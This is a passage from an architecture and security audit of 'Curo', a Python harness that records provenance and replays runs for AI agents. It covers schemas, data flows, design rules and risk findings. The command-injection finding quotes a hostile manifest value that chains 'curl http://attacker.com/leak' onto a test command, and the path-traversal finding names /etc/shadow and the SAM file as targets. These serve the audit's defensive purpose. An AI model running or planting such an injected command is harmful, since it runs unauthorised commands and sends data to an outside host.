  `["NOT_REQUIRED", "PENDING", "PROPOSED", "VALIDATION_PENDING", "VALIDATED", "PROMOTED", "REJECTED", "BLOCKED"]`.
- **Provenance Source Enum**:
  `["HARNESS_API", "HARNESS_CLI", "UI_OBSERVATION", "MODEL_SELF_REPORT", "UNAVAILABLE"]`.
- **Structural Constraints**: `additionalProperties: false`.

#### 9. `observability/run-event.schema.json`
- **Schema ID**: `https://curo.local/schemas/observability-run-event.schema.json`
- **Core Type**: `observability_run_event`
- **Required Properties**:
  `event_type`, `run_id`, `occurred_at`, `source`, `observation_status`.
- **Observation Status Enum**:
  `["OBSERVED", "VERIFIED", "PROPOSED", "UNKNOWN", "UNAVAILABLE", "DISPUTED"]`.
- **Structural Constraints**: `additionalProperties: false`.

### 4.3 Persistence Architecture: Immutable Flat-File Document Store
Curo does not utilize relational databases (RDBMS) or object-relational mapping (ORM) libraries. Instead, persistence is structured as an **immutable, flat-file document store** across four designated directories:

```text
evidence/
├── runs/                           # Tripartite execution records
│   ├── <run_id>-provenance.json    # Cryptographic input/output hash attestation
│   ├── <run_id>-run.json           # Execution telemetry, duration, and stream snippets
│   └── <run_id>-replay.json        # Self-contained replay manifest for offline rerun
├── review/                         # Exception packets
│   └── <packet_id>.json            # Structured HITL escalation packets
└── learning/                       # Evolutionary candidates
    └── <candidate_id>.json         # Governed learning proposals
```

### 4.4 Architectural Rationale for Avoiding RDBMS / ORM
1. **Model Neutrality & Zero Runtime Dependencies**: Relational databases introduce database engine dependencies (PostgreSQL, MySQL, SQLite C extensions), driver compilation issues, network connection pools, and migration management. Curo must execute immediately in restricted sandbox environments, CI runners, and air-gapped systems using Python standard library alone.
2. **Cryptographic Attestation & Immutability**: Relational databases operate on mutable state (`UPDATE`, `DELETE`). In contrast, AI evidence and provenance must be immutable, write-once records. FLAT JSON files hashed with SHA-256 provide verifiable tamper-evidence.
3. **Version Control Integration (Git-as-a-Datastore)**: Plain-text JSON, YAML, and Markdown files reside directly in Git. Team members and automated reviewers inspect diffs, pull requests, and commit histories using native VCS tooling.
4. **Boundary Isolation Against Model Manipulation**: If a database connection string or ORM session were exposed, autonomous agents could perform unauthorized SQL updates. File-based persistence under harness ownership ensures models have no direct write path to canonical evidence.

### 4.5 Authoritative Artifact Registry (`registry/registry.yaml`)
The central inventory of Curo is `registry/registry.yaml` (Document Version: 5, Owner: `harness`). It indexes **34 canonical artifacts**, each defined with 8 mandatory attributes:
- `id`: Unique kebab-case identifier.
- `path`: Relative repository path.
- `source`: Upstream lineage conversation or specification origin.
- `type`: Artifact classification (`standard`, `schema`, `contract`, `policy`, `template`, etc.).
- `version`: Semantic version string.
- `owner`: Authoritative owner (`harness` or `human_or_authorized_caller`).
- `status`: Lifecycle status (`active`).
- `updated_at`: Last update timestamp.
- `authoritative`: Boolean indicating whether this artifact is canonical or derived.

### 4.6 Concurrency & File System Operations
- **Atomic-Style Creation**: Directory hierarchies are created recursively on write using `Path.parent.mkdir(parents=True, exist_ok=True)`.
- **Serialization Guarantee**: JSON persistence enforces explicit UTF-8 encoding and trailing newlines (`safe_write_json`).
- **Concurrency Boundary**: The foundation release operates with single-process synchronous file handles. Concurrent multi-agent file writes are identified as an architectural limitation requiring lockfile mechanisms in multi-tenant swarms.

---

## 5. End-to-End Data Flows & Explicit Call Chains

### 5.1 Flow 1: Command Execution & Telemetry Lifecycle (`curo run`)

```text
[CLI / Agent Invocation]
        │  Command-line arguments: run <cmd> --id <ID> -i <in> -o <out>
        ▼
E:\curo\curo.py : sys.exit(main())
        │
        ▼
E:\curo\harness\curo_harness\cli.py : main(args)
        │  build_parser() parses subcommands; matches 'run'
        ▼
E:\curo\harness\curo_harness\run.py : execute_run(...)
        │
        ├─► STEP 1: Pre-Execution State Capture
        │    For each input_path in inputs:
        │      curo_harness.core.sha256_file(input_path)
        │      └── Streams 64 KB chunks via hashlib.sha256()
        │      └── Records hex digest into pre_input_hashes dict
        │      (If missing, records sentinel "FILE_NOT_FOUND")
        │
        ├─► STEP 2: Process Execution Under Harness Guard
        │    start_iso = curo_harness.core.utc_now_iso()
        │    start_perf = time.perf_counter()
        │    subprocess.run(command, shell=True, timeout=timeout_seconds, capture_output=True, text=True)
        │    Captures: proc.stdout, proc.stderr, proc.returncode
        │    Traps: subprocess.TimeoutExpired (sets status "TIMED_OUT", exit_code 124)
        │    Traps: Exception (sets exit_code 1)
        │    end_perf = time.perf_counter()
        │    duration_ms = (end_perf - start_perf) * 1000
        │
        ├─► STEP 3: Post-Execution State Capture
        │    For each output_path in outputs:
        │      curo_harness.core.sha256_file(output_path)
        │      └── Records hex digest into post_output_hashes dict
        │      (If missing on disk, records sentinel "OUTPUT_MISSING")
        │    (Pre-flight inputs missing on disk record sentinel "FILE_NOT_FOUND")
        │
        ├─► STEP 4: Tripartite Evidence Assembly
        │    1. provenance_record = {
        │         "record_type": "provenance_record", "artifact_id": run_id,
        │         "input_hash": combined_input_hash,   # single hash, "FILE_NOT_FOUND", "NONE", or "MULTIPLE_INPUTS"
        │         "output_hash": combined_output_hash, # single hash, "OUTPUT_MISSING", "NONE", or "MULTIPLE_OUTPUTS"
        │         "validator_result": "PASS" if final_status == "SUCCESS" else "FAIL",
        │         "owner": "harness", "created_at": end_iso,
        │         "source_conversation_id": "curo-execution-harness",
        │         "source_note": f"Executed: {command}"
        │       }
        │       (Note: validator_result records "PASS" whenever the subprocess returns 0, even if inputs or outputs were missing)
        │    2. run_record = {
        │         "run_id": run_id, "status": final_status, "command": command,
        │         "exit_code": exit_code, "duration_ms": duration_ms,
        │         "inputs": pre_input_hashes, "outputs": post_output_hashes,
        │         "stdout_snippet": stdout_text[-1000:], "stderr_snippet": stderr_text[-1000:]
        │       }
        │    3. replay_manifest = {
        │         "manifest_type": "replay_manifest", "artifact_id": run_id,
        │         "version": "1.0.0", "command": command,
        │         "inputs": [{"path": k, "sha256": v}, ...],
        │         "expected_outputs": [{"path": k, "sha256": v}, ...],
        │         "expected_checks": ["input_hash_verification", "exit_code_zero", ...],
        │         "provenance": provenance_record
        │       }
        │
        ├─► STEP 5: Atomic Filesystem Persistence
        │    curo_harness.core.safe_write_json(prov_path, provenance_record)
        │    curo_harness.core.safe_write_json(run_path, run_record)
        │    curo_harness.core.safe_write_json(replay_path, replay_manifest)
        │
        ▼
Return JSON dictionary to stdout & return code to OS (0 on SUCCESS, else exit_code)
```

### 5.2 Flow 2: Deterministic Replay Verification Lifecycle (`curo replay`)

```text
[Operator / CI Invocation]
        │  Command-line: replay <path-to-replay-manifest.json>
        ▼
E:\curo\curo.py : sys.exit(main())
        │
        ▼
E:\curo\harness\curo_harness\cli.py : main(args)
        │  Matches 'replay'; calls execute_replay(manifest_path)
        ▼
E:\curo\harness\curo_harness\replay.py : execute_replay(...)
        │
        ├─► STEP 1: Manifest Deserialization & Validation
        │    curo_harness.core.safe_read_json(manifest_path)
        │    Asserts manifest contains 'command'
        │
        ├─► STEP 2: Pre-Flight Input Verification Gate
        │    For each inp in manifest["inputs"]:
        │      actual_hash = curo_harness.core.sha256_file(inp["path"])
        │      Compares actual_hash == inp["sha256"]
        │    IF ANY INPUT FAILS:
        │      ABORT EXECUTION -> Returns status: "BLOCKED",
        │      reason: "Pre-flight input hashes did not match recorded replay manifest."
        │
        ├─► STEP 3: Isolated Command Re-Execution
        │    subprocess.run(manifest["command"], shell=True, timeout=300, capture_output=True)
        │    IF exit_code != 0:
        │      ABORT -> Returns status: "FAIL", reason: "Process exited with non-zero status"
        │
        ├─► STEP 4: Post-Flight Output Verification Gate
        │    For each out in manifest["expected_outputs"]:
        │      actual_hash = curo_harness.core.sha256_file(out["path"])
        │      Compares actual_hash == out["sha256"]
        │
        ├─► STEP 5: Verification Verdict Determination
        │    IF all outputs matched: final_status = "REPLAY_VERIFIED"
        │    ELSE: final_status = "REPLAY_DRIFT_DETECTED"
        │
        ▼
Returns verification summary to CLI (Exit code 0 on REPLAY_VERIFIED, 1 on DRIFT/FAIL)
```

### 5.3 Flow 3: Exception Review & HITL Escalation Lifecycle (`curo escalate`)

```text
[Failure / Ambiguity / Loop Limit Reached]
        │  Command-line: escalate --id <ID> --finding <desc> --class human_decision
        ▼
E:\curo\curo.py ──► curo_harness\cli.py ──► curo_harness\escalate.py
        │
        ├─► STEP 1: Finding Class Validation
        │    Asserts finding_class in {'mechanical', 'engineering', 'evidence_required', 'human_decision'}
        │
        ├─► STEP 2: Structured Packet Construction
        │    Assembles dictionary with:
        │      artifact_type = "curo_hitl_packet", status = "HITL_REQUIRED",
        │      summary counters, blocking_findings list, decisions list, authorized_transition
        │
        ├─► STEP 3: Flat-File Persistence
        │    curo_harness.core.safe_write_json(evidence/review/<packet_id>.json, packet)
        │
        ▼
Returns escalation summary; halts autonomous execution pending human review
```

### 5.4 Flow 4: Learning Distillation Lifecycle (`curo distill`)

```text
[Analyzed Run / Optimized Pattern Identified]
        │  Command-line: distill --id <ID> --run-id <run_id> --title <title> --type rule
        ▼
E:\curo\curo.py ──► curo_harness\cli.py ──► curo_harness\distill.py
        │
        ├─► STEP 1: Proposal Classification Validation
        │    CLI Layer (cli.py:56): Restricts --type choices to {'rule', 'skill', 'anti_pattern', 'validator'}
        │    Engine Layer (distill.py:22): Asserts proposed_type in {'rule', 'skill', 'anti_pattern', 'validator', 'standard_amendment'}
        │    (Note: Passing 'standard_amendment' via CLI is rejected by argparse prior to reaching distill.py)
        │
        ├─► STEP 2: Candidate Proposal Assembly
        │    Constructs proposal dictionary with:
        │      status = "CANDIDATE_PROPOSED", promotion_gate = "HITL_REQUIRED",
        │      source_run_id, title, summary, pattern, evidence_references
        │
        ├─► STEP 3: Flat-File Persistence
        │    curo_harness.core.safe_write_json(evidence/learning/<candidate_id>.json, candidate)
        │
        ▼
Returns proposal summary; candidate queued for human review and regression testing
```

### 5.5 Flow 5: System Integrity Validation Lifecycle (`validate_curo.py`)

```text
[Pre-Commit / Pre-Promotion Gate]
        │  Command-line: python scripts/validate_curo.py
        ▼
E:\curo\scripts\validate_curo.py : main()
        │
        ├─► Gate 1: check_required_files()
        │    Extracts paths from registry/registry.yaml; asserts all 34 exist on disk
        │
        ├─► Gate 2: check_json_schemas()
        │    Iterates schemas/*.schema.json & observability/*.schema.json; asserts valid JSON syntax
        │
        ├─► Gate 3: check_registry()
        │    Verifies 34 expected IDs and 8 mandatory metadata keys per registry entry
        │
        ├─► Gate 4: check_standard_headings()
        │    Parses docs/operating-standard.md; asserts no duplicate markdown headings
        │
        ├─► Gate 5: check_version_sync()
        │    Extracts version strings across project.yaml, operating-standard.md,
        │    replay template, and registry; asserts exact match (1.8.0)
        │
        ├─► Gate 6: check_sentinels()
        │    Asserts uppercase UNKNOWN sentinel rule and rejects lowercase 'unknown'
        │
        ├─► Gate 7: check_schema_links()
        │    Asserts schemas/replay-manifest.schema.json has $ref -> provenance-record.schema.json
        │
        ▼
Outputs "PASS: Curo foundation integrity checks" (exit 0) or prints failure list (exit 1)
```

---

## 6. Key Design Patterns & Architectural Decisions

### 6.1 Model Neutrality and Provider Decoupling
- **Source**: `adapters/adapter-contract.md`
- **Pattern**: *Port-and-Adapter / Hexagonal Architecture*.
- **Mechanism**: The core specification and execution harness know nothing about specific LLM providers. Prompts, formats, and vendor-specific parameters are handled by peripheral adapters.
- **Rule**: Adapters may translate formats; they may never alter truth ownership or overwrite canonical execution records.

### 6.2 Deterministic Execution & Cryptographic Provenance
- **Source**: `core-policies/validation.md`, `harness/curo_harness/core.py`
- **Pattern**: *Content-Addressed Immutability / Hash Chains*.
- **Mechanism**: Every input file and output file is hashed with SHA-256 in 64 KB streaming blocks. Dictionary payloads are canonically serialized (`sort_keys=True, separators=(',', ':')`) prior to digest generation. Replay manifests bind the command, inputs, and expected outputs together, enabling offline verification without third-party services.

### 6.3 Strict Six-Tier Authority Precedence Ladder
- **Source**: `core-policies/precedence.md`
- **Hierarchy**:
  1. **Deterministic validator** (Highest authority)
  2. **Harness policy**
  3. **Captured evidence**
  4. **Context contract**
  5. **Prompt instruction**
  6. **Model judgment** (Lowest authority — proposal only)
- **Conflict Rule**: When a lower tier conflicts with a higher tier, the higher-precedence source is authoritative. The lower source is marked superseded or disputed, and conflicting evidence is preserved for operator review.

### 6.4 Separation of Truth Ownership
- **Source**: `core-policies/ownership.md`, `project.yaml`
- **Ownership Domain Allocation**:
  - `objective`: Human or authorized caller.
  - `operational_state`: Harness.
  - `prompt_template`: Versioned artifact.
  - `context_selection`: Context builder under harness policy.
  - `tool_authority`: Harness or policy guard.
  - `execution`: Harness-controlled tool layer.
  - `validation`: Deterministic validator where feasible.
  - `provenance`: Harness.
  - `evidence_persistence`: Harness.
  - `replay_manifests`: Harness.
  - `observability`: Harness or designated writer.
  - `learning_distillation`: Harness proposal tier.
  - `capability_measurements`: Evaluation pipeline.
  - `pending_decisions`: Human or authorized caller.

### 6.5 Five Prohibited Agentic Anti-Patterns
- **Source**: `anti-patterns/anti-patterns.md`
- **Catalog**:
  1. **Self-Reported Validation**: A model asserting that code compiles or tests pass without an external check.
  2. **Invented Provenance**: Fabricating origin metadata or source citations when the real history is unknown.
  3. **Model-First Recovery**: Replacing or fine-tuning models when the underlying flaw is a bad prompt, malformed context, or unhandled loop edge case.
  4. **Unowned Records**: Generating reports or status entries without an authoritative, declared owner.
  5. **Hidden Authority**: Introducing validation gates or write permissions that cannot be inspected and independently verified.

### 6.6 Bounded Exception Review Protocol
- **Source**: `review/exception-review-protocol.md`
- **Pattern**: *Bounded Iteration & Escaping State Machine*.
- **Rules**:
  - Bounded iteration: Autonomous model correction is capped at **3 cycles**.
  - Repetition guard: An identical failing finding may not be retried more than **2 times**.
  - Exit states: `RESOLVED_AUTOMATICALLY`, `RESOLVED_BY_MODEL`, `RESOLVED_BY_EVIDENCE`, `ESCALATED_TO_HITL`, `BLOCKED`.

---

## 7. External Dependencies, Build & Packaging Architecture

### 7.1 Zero-Dependency Standard Library Model
Curo is architected to run with **zero external dependencies**. It relies exclusively on the Python 3 standard library:
- `argparse`: Command-line interface definitions and argument parsing.
- `datetime` & `time`: ISO-8601 UTC timestamp generation and high-resolution timing (`time.perf_counter()`).
- `hashlib`: Cryptographic SHA-256 digest computation.
- `json`: Canonical JSON encoding and decoding.
- `os` & `pathlib`: Cross-platform filesystem navigation and path manipulation.
- `re`: Regular expressions for schema checking and version matching in `validate_curo.py`.
- `subprocess`: Isolated process execution and telemetry capture.
- `sys`: Dynamic path resolution and process return codes.
- `typing`: Type annotations (`Optional`, `Dict`, `List`, `Union`, `Tuple`, `Any`).
- `unittest`: Automated testing framework.

### 7.2 Third-Party Library Strategy & Graceful Degradation
- **`jsonschema`**: Dynamically probed at runtime in `curo_harness/validator.py` (lines 81–85). If installed in the host Python environment, Draft 2020-12 validation is delegated to `jsonschema.validate(instance=payload, schema=schema)`. If absent, the harness gracefully degrades to built-in dictionary inspections without throwing an `ImportError`.
  - *Reference Resolution Limitation*: Because `validator.py` does not pass a `base_uri` or configure a `RefResolver` / `Registry`, schemas with relative `$ref` pointers (such as `schemas/replay-manifest.schema.json` line 40 referencing `provenance-record.schema.json`) fail with `JSONSchema validation error: Unresolvable: provenance-record.schema.json` even when both schema files exist in the same directory.

### 7.3 Build System & Packaging Assessment
- **Package Managers**: None. Intentionally avoids `pip`, `poetry`, `uv`, `conda`, `npm`, `yarn`, or `cargo`.
- **Build Systems**: Interpreted directly by Python 3.9+. No compilation or transpilation steps are required.
- **Packaging Files**: No `setup.py`, `pyproject.toml`, or `requirements.txt`. The repository can be cloned or copied into any standard environment and executed immediately via `python curo.py`.
- **Source File Encoding & Byte Order Mark (BOM)**: All Python source files in `harness/curo_harness/`, `curo.py`, and `tests/test_harness.py` are encoded with a UTF-8 Byte Order Mark (BOM: `\xef\xbb\xbf`). While Python's source tokenizer automatically strips BOMs during direct invocation, third-party AST parsers or static analyzers reading files with `encoding="utf-8"` encounter `SyntaxError: invalid non-printable character U+FEFF`. Tools must specify `encoding="utf-8-sig"` when inspecting Curo source files.

---

## 8. Dedicated Security & Risk Observations

The architectural review identified five actionable risk findings and one low-priority design consideration across the backend engine and persistence layers:

### 8.1 Critical Risk 01: Arbitrary Command Injection & Windows Process-Tree Timeout Leak via `subprocess.run(..., shell=True)`
- **Affected Components**:
  - `E:\curo\harness\curo_harness\run.py`, lines 48–55 (`command` line 49, `shell=True` line 50)
  - `E:\curo\harness\curo_harness\replay.py`, lines 66–73 (`command` line 67, `shell=True` line 68)
- **Code Reference**:
  ```python
  # run.py lines 48-55 / replay.py lines 66-73
  proc = subprocess.run(
      command,
      shell=True,
      cwd=str(working_dir),
      capture_output=True,
      text=True,
      timeout=timeout_seconds,
  )
  ```
- **Vulnerability Mechanisms**:
  1. *Arbitrary Command Execution*: In both `execute_run` and `execute_replay`, `command` is passed as an unparsed string to `subprocess.run` with `shell=True`. In `replay.py`, `command` is ingested directly from an external JSON manifest (`manifest.get("command")`). An untrusted or hostile manifest (e.g. containing `"command": "pytest & curl http://attacker.com/leak"`) executes arbitrary system commands under host process privileges.
  2. *Windows Process-Tree Orphan & Timeout Blocking Leak*: On Windows, `shell=True` launches `cmd.exe`, which spawns the requested command as a child process. When `timeout_seconds` expires, Python's `subprocess.run()` kills the top-level shell (`cmd.exe`), but does not terminate the child process tree. The orphaned child process continues running in the background while holding open inherited stdout/stderr pipe handles. Consequently, Python's internal `communicate()` blocks waiting for EOF, freezing the harness until the child process terminates. Empirical testing with a 1.0s timeout and a 5-second sleep blocked Python execution for 9,420 ms (9.42s), bypassing the intended timeout constraint.
- **Actionable Remediation**:
  1. Set `shell=False` in `subprocess.run` across `run.py` and `replay.py`.
  2. Require commands to be passed as argument vectors (`List[str]`), or parse strings safely via `shlex.split(command, posix=(os.name != 'nt'))`.
  3. On Windows, manage spawned processes using Windows Job Objects (`win32job` or native OS APIs with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) or execute process-tree termination via `taskkill /F /T /PID <pid>` when trapping `TimeoutExpired`.
  4. Implement a strict binary allowlist restricting executable invocations to designated interpreters (e.g. `python`, `pytest`).

### 8.2 High Risk 02: Schema Drift and Broken Validation in Runtime Persistence
- **Affected Components**:
  - `E:\curo\harness\curo_harness\run.py`, lines 110–122 vs `observability/run-record.schema.json`
  - `E:\curo\harness\curo_harness\run.py`, lines 135–144 vs `schemas/replay-manifest.schema.json`
  - `E:\curo\harness\curo_harness\replay.py`, lines 27–32 vs `schemas/replay-manifest.schema.json`
  - `E:\curo\harness\curo_harness\distill.py`, lines 26–37 vs `schemas/learning-candidate.schema.json`
  - `E:\curo\harness\curo_harness\escalate.py`, lines 41–49 vs `schemas/hitl-packet.schema.json` & `schemas/review-findings.schema.json`
  - `E:\curo\harness\curo_harness\validator.py`, line 63 (runtime `TypeError` crash on union types)
- **Vulnerability Mechanism**:
  - *Missing Pre-Persistence Validation*: In `run.py` line 12, `validate_curo_payload` is imported but **never called** prior to persisting evidence files to disk.
  - *Run Record Schema Drift*: The dictionary emitted by `run.py` violates `observability/run-record.schema.json`. The schema specifies `additionalProperties: false` and mandates `record_type`, `recorded_at`, `project_id`, `workflow_id`, `role`, `provenance_source`, `evidence_locators`, and `next_authorized_action`. None of these required fields are populated by `run.py`, and `status: "SUCCESS"` is not in the schema status enum.
  - *Replay Manifest Schema Drift*: `schemas/replay-manifest.schema.json` enforces `additionalProperties: false` and only defines properties `manifest_type`, `artifact_id`, `version`, `inputs`, `expected_checks`, and `provenance`. It omits `command` and `expected_outputs`. However, `run.py` writes both `command` and `expected_outputs` into `{run_id}-replay.json`, and `replay.py` strictly requires `manifest.get("command")`. Consequently, every executable replay manifest generated by the harness fails validation against `replay-manifest.schema.json`.
  - *Learning Candidate Drift*: In `distill.py`, emitted candidate records populate `status: "CANDIDATE_PROPOSED"`, `proposed_type`, `summary`, and `promotion_gate`. However, `schemas/learning-candidate.schema.json` requires `artifact_type`, `artifact_version`, `project_id`, `owner`, `candidate_type`, `proposed_change`, `requires_hitl` and enforces status enum `["PROPOSED", "VALIDATION_PENDING", ...]`.
  - *HITL Packet Schema Alignment*: `escalate.py` emits `curo_hitl_packet` matching `schemas/hitl-packet.schema.json`, but internal finding objects use `finding_class` and `blocking` rather than aligning with `schemas/review-findings.schema.json` (`class` and `requires_human_decision`).
  - *Validator Crash on Canonical Payloads*: Attempting to validate payloads using `validate_curo_payload()` crashes with `TypeError: unhashable type: 'list'` at `validator.py:63` whenever encountering union types (`"type": ["string", "null"]`), which are present in `provenance-record.schema.json` (`source_conversation_id`, `source_note`) and `run-event.schema.json`.
- **Actionable Remediation**:
  1. Synchronize `schemas/replay-manifest.schema.json` to declare `command` (`type: string`) and `expected_outputs` (`type: array`), or update `run.py`/`replay.py` to nest execution directives within an allowed property.
  2. Synchronize the dictionary structures emitted by `run.py` and `distill.py` with their respective JSON schema definitions.
  3. Fix `validator.py` line 63 to handle list-based union types (e.g. `if isinstance(expected_type_str, str) and expected_type_str in type_map:` or checking elements of union lists).
  4. Implement mandatory pre-persistence validation: invoke `validate_curo_payload()` before writing to disk, raising an exception if validation fails.

### 8.3 Medium Risk 03: Sensitive Information Disclosure in Unredacted Telemetry Snippets
- **Affected Components**:
  - `E:\curo\harness\curo_harness\run.py`, lines 120–121
- **Code Reference**:
  ```python
  "stdout_snippet": stdout_text[-1000:] if len(stdout_text) > 1000 else stdout_text,
  "stderr_snippet": stderr_text[-1000:] if len(stderr_text) > 1000 else stderr_text,
  ```
- **Vulnerability Mechanism**:
  The harness captures the trailing 1,000 characters of stdout and stderr and writes them in plaintext into `evidence/runs/<run_id>-run.json`. If a failing command dumps environment variables, database connection strings, bearer tokens, or API credentials, these secrets are permanently recorded in the git-tracked evidence store.
- **Actionable Remediation**:
  1. Implement a regex-based secret scrubbing filter in `core.py` to mask detected tokens, authorization headers, private keys, and high-entropy strings prior to persistence.
  2. Provide a `--mask-secrets` CLI flag that defaults to enabled.

### 8.4 Medium Risk 04: Path Traversal & Out-of-Bounds Filesystem Access
- **Affected Components**:
  - `E:\curo\harness\curo_harness\run.py`, line 125
  - `E:\curo\harness\curo_harness\replay.py`, lines 40 & 96
- **Vulnerability Mechanism**:
  `execute_run` accepts an arbitrary `evidence_dir` string without path sanitization. Passing `--evidence-dir ../../../etc` permits writing JSON evidence files outside the workspace. Similarly, `replay.py` constructs input file paths using `working_dir / file_rel if not Path(file_rel).is_absolute() else Path(file_rel)`. If a manifest specifies absolute paths (e.g. `C:\Windows\System32\config\SAM` or `/etc/shadow`), the harness attempts to read and hash sensitive system files.
- **Actionable Remediation**:
  1. Enforce strict workspace containment: assert that `resolved_path.is_relative_to(working_dir)` or verify via `os.path.commonpath`.
  2. Reject absolute paths in replay manifests.

### 8.5 High Risk 05: Unvalidated Provenance PASS Assertion and Sentinel Policy Drift
- **Affected Components**:
  - `E:\curo\harness\curo_harness\run.py`, lines 36, 79, 100–102 vs `docs/operating-standard.md`
- **Vulnerability Mechanism**:
  1. *Erroneous Provenance PASS Certification*: In `run.py` line 102, the harness determines the provenance check verdict via `"validator_result": "PASS" if final_status == "SUCCESS" else "FAIL"`. If a command executes with exit code 0, `final_status` is `"SUCCESS"`. Consequently, if a caller specifies non-existent input files or expected output files that were never created, `run.py` generates a signed provenance record asserting `"validator_result": "PASS"` despite missing files. This directly contradicts Curo's core principle that "The checker writes the check result" and creates an invalid chain of custody for missing artifacts.
  2. *Sentinel Policy Drift*: When files are missing, `run.py` records `"FILE_NOT_FOUND"` (line 36) and `"OUTPUT_MISSING"` (line 79). However, Curo's canonical policy in `docs/operating-standard.md` mandates that "Unknown provenance should remain UNKNOWN". Using non-standard strings causes downstream consumers expecting canonical sentinels (`UNKNOWN`) to misclassify artifact status.
- **Actionable Remediation**:
  1. In `run.py`, gate `"validator_result"` so that it resolves to `"FAIL"` or `"UNKNOWN"` if any declared input file is missing (`FILE_NOT_FOUND`) or any expected output file was not produced (`OUTPUT_MISSING`), regardless of process exit code.
  2. Normalize missing-file sentinels to the canonical `UNKNOWN` token mandated by the operating standard.

### 8.6 Low Risk 06: Hardcoded Replay Timeout & Missing Concurrency Locks
- **Affected Components**:
  - `E:\curo\harness\curo_harness\replay.py`, line 72 (`timeout=300`)
  - `E:\curo\harness\curo_harness\core.py`, lines 54–60
- **Vulnerability Mechanism**:
  `execute_run` supports a configurable `timeout_seconds` parameter, but `execute_replay` hardcodes `timeout=300`. Long-running computational tasks will be killed prematurely. Furthermore, concurrent writes to the evidence store by parallel subagents can cause race conditions and file corruption due to the absence of file locks.
- **Actionable Remediation**:
  1. Record execution duration in the replay manifest and allow an override `--timeout` flag in `replay.py`.
  2. Implement cross-platform advisory file locking (`msvcrt.locking` on Windows, `fcntl.flock` on POSIX) during file writes.

### 8.7 Positive Audit Finding: Clean Credential Hygiene
- **Observation**: Comprehensive regex scanning across all repository files (`.yaml`, `.json`, `.py`, `.md`) confirmed that **zero API keys, private keys, authentication tokens, or personal passwords** are committed to the codebase.
- **Policy Compliance**: All templates explicitly declare `credentials_status: NOT_YET` and enforce environment variable injection.

---

## 9. Comprehensive Mapping to the Four Audit Areas

### 9.1 Audit Area 1: Backend / API / Core Engine
- **Components**: `curo.py`, `harness/curo_harness/cli.py`, `run.py`, `replay.py`, `escalate.py`, `distill.py`, `validator.py`.
- **Architecture**: Synchronous, CLI-driven execution engine. Subcommands invoke specialized handlers that run subprocesses, capture standard I/O, compute SHA-256 hashes, and output structured JSON.
- **Status**: Zero active network daemons or open HTTP ports; foundation maturity.

### 9.2 Audit Area 2: Frontend / CLI / Interface Layer
- **Components**:
  - Primary Interface: Master CLI router (`curo.py` / `cli.py`) supporting `run`, `replay`, `escalate`, `distill`, `doctor`.
  - Secondary Interface: Package validator (`scripts/validate_curo.py`) executing 7 integrity checks.
  - Client / UI Guidelines: UX contracts and state management decoupled from harness execution (`templates/project-kickoff.yaml`, `skills/curo-simulation-builder.md`).

### 9.3 Audit Area 3: Data Models, Persistence & Storage
- **Components**: `schemas/*.schema.json`, `observability/*.schema.json`, `registry/registry.yaml`, `evidence/`.
- **Architecture**: Immutable flat-file document store using JSON Schema Draft 2020-12 contracts.
- **Integrity**: 34 registered canonical artifacts; strict absence of RDBMS/ORMs; cryptographic content addressing.

### 9.4 Audit Area 4: Build Systems & Dependencies
- **Components**: Python 3.9+ standard library runtime (`argparse`, `hashlib`, `json`, `subprocess`, `unittest`).
- **Dependencies**: 100% dependency-free; optional dynamic import of `jsonschema`.
- **Packaging**: Zero package managers; direct execution without compilation or pip installation.

---

## 10. Developer Quick Reference & Command Cheat Sheet

### 10.1 Running a Command under the Harness
```bash
python curo.py run "python tests/test_harness.py" \
  --id "RUN-20260907-001" \
  --input "tests/test_harness.py" \
  --timeout 120.0
```

### 10.2 Verifying an Offline Replay Manifest
```bash
# Step 1: Execute a run under the harness to generate a live, executable replay manifest
python curo.py run "python tests/test_harness.py" \
  --id "REPLAY-DEMO-001" \
  --input "tests/test_harness.py"

# Step 2: Deterministically replay and verify the generated manifest
python curo.py replay evidence/runs/REPLAY-DEMO-001-replay.json
```

> **Implementation Note on Static Specification Manifests**: The repository manifest `manifests/math-node-v0.1-replay.json` is a historical specification contract digest conforming to `schemas/replay-manifest.schema.json`. It catalogs contract and source file SHA-256 hashes from prior milestones, but intentionally lacks a `"command"` property. Invoking `python curo.py replay manifests/math-node-v0.1-replay.json` fails with exit code 1 (`"Manifest does not specify a 'command' to replay."`) because `curo_harness/replay.py` requires an executable `"command"` to re-run the subprocess. Replay verification commands must target manifests generated via `curo run` or manifests authored with an explicit `"command"`.

### 10.3 Escalating a Blocking Decision to Human-in-the-Loop
```bash
python curo.py escalate \
  --id "HITL-DEC-20260907" \
  --project "curo-core" \
  --review-id "REV-001" \
  --finding "Ambiguous precedence between context contract and prompt override" \
  --class "human_decision"
```

### 10.4 Distilling a Learning Candidate from a Run
```bash
python curo.py distill \
  --id "LC-20260907-001" \
  --run-id "RUN-20260907-001" \
  --title "Deterministic SHA256 Chunking" \
  --type "rule" \
  --summary "Always read binary files in 64KB chunks to prevent memory spikes"
```

### 10.5 Running the Repository Self-Check Validator
```bash
python scripts/validate_curo.py
```

### 10.6 Running the Harness Test Suite
```bash
python -m unittest tests/test_harness.py
```
